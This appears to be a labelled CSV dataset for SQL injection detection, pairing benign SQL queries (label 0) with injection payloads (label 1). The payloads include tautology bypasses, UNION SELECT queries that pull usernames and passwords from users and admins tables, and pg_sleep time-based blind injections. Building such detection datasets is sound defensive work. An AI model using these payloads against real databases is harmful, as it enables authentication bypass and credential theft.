text,label
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT * FROM users WHERE username = 'user12' UNION SELECT username, password FROM admins --",1
SELECT * FROM users WHERE username = 'user20' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 55 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title404' IS NULL OR title LIKE '%title404%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM sessions WHERE session_id = 'sess_60714' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 83 OR '1'='1' --,1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title674' IS NULL OR title LIKE '%title674%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM posts WHERE id = 86 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT * FROM users WHERE username = 'user41' UNION SELECT username, password FROM admins --",1
"SELECT * FROM users WHERE username = 'user57' UNION SELECT username, password FROM admins --",1
SELECT * FROM users WHERE username = 'user98' AND password = 'pass98',0
DELETE FROM posts WHERE id = 28,0
DELETE FROM posts WHERE id = 13,0
SELECT * FROM posts WHERE id = 38 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT salt FROM users WHERE username = 'user26',0
SELECT salt FROM users WHERE username = 'user49',0
DELETE FROM posts WHERE id = 11,0
SELECT user_id FROM sessions WHERE session_id = 'sess_26690' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 94,0
"SELECT id FROM sessions WHERE session_id = 'sess_13387' UNION SELECT id, role FROM admins --",1
SELECT * FROM users WHERE username = 'user40' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
DELETE FROM posts WHERE id = 50,0
SELECT * FROM sessions WHERE session_id = 'sess_43307' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_22625' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title572' IS NULL OR title LIKE '%title572%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM posts WHERE id = 94,0
SELECT * FROM sessions WHERE session_id = 'sess_50651' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT * FROM users WHERE username = 'user87' UNION SELECT username, password FROM admins --",1
SELECT salt FROM users WHERE username = 'user100',0
SELECT user_id FROM sessions WHERE session_id = 'sess_7566' AND expire_date > NOW(),0
DELETE FROM posts WHERE id = 78,0
SELECT * FROM posts WHERE id = 62 OR '1'='1' --,1
SELECT salt FROM users WHERE username = 'user36',0
"SELECT id FROM sessions WHERE session_id = 'sess_80559' UNION SELECT id, role FROM admins --",1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass75',1
SELECT * FROM users WHERE username = 'user73' AND password = 'pass73',0
SELECT * FROM posts WHERE id = 34,0
DELETE FROM posts WHERE id = 65,0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass59',1
SELECT * FROM sessions WHERE session_id = 'sess_55278' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
DELETE FROM posts WHERE id = 81,0
SELECT * FROM posts WHERE id = 42,0
"SELECT id FROM sessions WHERE session_id = 'sess_95296' UNION SELECT id, role FROM admins --",1
SELECT * FROM posts WHERE id = 96,0
SELECT salt FROM users WHERE username = 'user4',0
DELETE FROM posts WHERE id = 24,0
DELETE FROM posts WHERE id = 46,0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT salt FROM users WHERE username = 'user64',0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title576' IS NULL OR title LIKE '%title576%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
DELETE FROM posts WHERE id = 13,0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title631' IS NULL OR title LIKE '%title631%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title422' IS NULL OR title LIKE '%title422%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass8',1
SELECT * FROM users WHERE username = 'user22' AND password = 'pass22',0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass77',1
SELECT * FROM posts WHERE id = 42 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass50',1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title145' IS NULL OR title LIKE '%title145%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
DELETE FROM posts WHERE id = 35,0
SELECT salt FROM users WHERE username = 'user49',0
SELECT salt FROM users WHERE username = 'user11',0
SELECT * FROM sessions WHERE session_id = 'sess_94419' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user38' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 18,0
DELETE FROM posts WHERE id = 67,0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass42',1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT * FROM users WHERE username = 'user62' AND password = 'pass62',0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
DELETE FROM posts WHERE id = 94,0
SELECT * FROM posts WHERE id = 6 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 56 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_54831' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 79,0
SELECT * FROM sessions WHERE session_id = 'sess_56138' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user70' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 95,0
"SELECT * FROM users WHERE username = 'user17' UNION SELECT username, password FROM admins --",1
SELECT * FROM sessions WHERE session_id = 'sess_24417' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass4',1
SELECT user_id FROM sessions WHERE session_id = 'sess_50104' AND expire_date > NOW(),0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
DELETE FROM posts WHERE id = 50,0
SELECT user_id FROM sessions WHERE session_id = 'sess_60776' AND expire_date > NOW(),0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title544' IS NULL OR title LIKE '%title544%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
DELETE FROM posts WHERE id = 94,0
"SELECT * FROM users WHERE username = 'user75' UNION SELECT username, password FROM admins --",1
SELECT * FROM sessions WHERE session_id = 'sess_82263' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_79548' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 41,0
DELETE FROM posts WHERE id = 31,0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title53' IS NULL OR title LIKE '%title53%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM users WHERE username = 'user43' AND password = 'pass43',0
SELECT salt FROM users WHERE username = 'user6',0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title350' IS NULL OR title LIKE '%title350%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT user_id FROM sessions WHERE session_id = 'sess_70254' AND expire_date > NOW(),0
SELECT user_id FROM sessions WHERE session_id = 'sess_64584' AND expire_date > NOW(),0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_6104' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 93 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass57',1
SELECT * FROM users WHERE username = 'user46' AND password = 'pass46',0
SELECT user_id FROM sessions WHERE session_id = 'sess_87942' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 92,0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title643' IS NULL OR title LIKE '%title643%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT salt FROM users WHERE username = 'user31',0
SELECT * FROM posts WHERE id = 94 OR '1'='1' --,1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass43',1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_15869' AND expire_date > NOW(),0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_97164' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 90,0
DELETE FROM posts WHERE id = 96,0
SELECT * FROM sessions WHERE session_id = 'sess_13737' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user8' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_50166' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_83441' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 92 OR '1'='1' --,1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title386' IS NULL OR title LIKE '%title386%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
DELETE FROM posts WHERE id = 92,0
SELECT * FROM users WHERE username = 'user48' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_9395' AND expire_date > NOW(),0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM sessions WHERE session_id = 'sess_95217' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
DELETE FROM posts WHERE id = 58,0
SELECT * FROM posts WHERE id = 48 OR '1'='1' --,1
SELECT salt FROM users WHERE username = 'user27',0
SELECT * FROM posts WHERE id = 13 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_99754' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT * FROM users WHERE username = 'user6' UNION SELECT username, password FROM admins --",1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT salt FROM users WHERE username = 'user14',0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title794' IS NULL OR title LIKE '%title794%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM users WHERE username = 'user44' AND password = 'pass44',0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass33',1
DELETE FROM posts WHERE id = 80,0
"SELECT * FROM users WHERE username = 'user88' UNION SELECT username, password FROM admins --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title171' IS NULL OR title LIKE '%title171%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM posts WHERE id = 10 OR '1'='1' --,1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT id FROM sessions WHERE session_id = 'sess_65473' UNION SELECT id, role FROM admins --",1
SELECT salt FROM users WHERE username = 'user100',0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title466' IS NULL OR title LIKE '%title466%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM posts WHERE id = 35 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 100 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE username = 'user56' AND password = 'pass56',0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title363' IS NULL OR title LIKE '%title363%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title863' IS NULL OR title LIKE '%title863%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
DELETE FROM posts WHERE id = 22,0
